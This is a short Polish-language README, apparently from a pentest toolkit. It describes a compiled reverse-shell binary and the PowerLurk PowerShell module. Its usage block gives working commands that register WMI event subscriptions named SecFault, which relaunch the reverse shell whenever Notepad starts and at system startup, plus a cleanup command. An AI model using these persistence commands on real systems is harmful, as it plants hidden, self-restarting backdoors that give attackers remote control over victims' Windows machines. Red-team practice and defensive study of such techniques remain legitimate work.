# revshell.exe
revshell.exe to skompilowana binarka z revershellem w c źródło: https://github.com/tudorthe1ntruder/reverse-shell-poc

# PowerLurk.ps1
Wrapper na funkcjie WMI 
źródło: 
- https://github.com/Sw4mpf0x/PowerLurk
- https://pentestarmoury.com/2016/07/13/151/
Przykład użycia 
```powershell
Import-Module .\PowerLurk.ps1
# To pozwoli na uruchomienie binarki revshell.exe za każdym razem jak zostanie uruchomiony notatnik
Register-MaliciousWMIEvent -EventName SecFault -PermanentCommand "/path/to/revshell.exe" -Trigger ProcessStart -ProcessName notepad.exe
# RevShell podczas startup
Register-MaliciousWMIEvent -EventName SecFault -Trigger Startup -PermanentCommand "C:\Users\User\Desktop\revshell.exe"
# Żeby wyczyścić wszysktie stworzone eventy wmi o nazwie SecFault
Get-WmiEvent -Name SecFault | Remove-WmiObject
```